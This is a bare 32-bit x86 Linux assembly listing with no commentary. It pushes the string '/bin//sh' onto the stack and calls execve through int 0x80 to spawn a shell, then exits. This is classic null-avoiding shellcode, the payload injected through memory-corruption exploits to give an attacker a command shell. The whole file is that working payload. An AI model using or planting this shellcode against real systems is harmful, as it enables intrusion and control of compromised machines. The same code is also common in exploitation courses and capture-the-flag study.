section .text
BITS 32

global _start

_start:

xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
mov    al,0xb
xor    ecx,ecx
int    0x80

xor eax,eax
inc eax
int 0x80


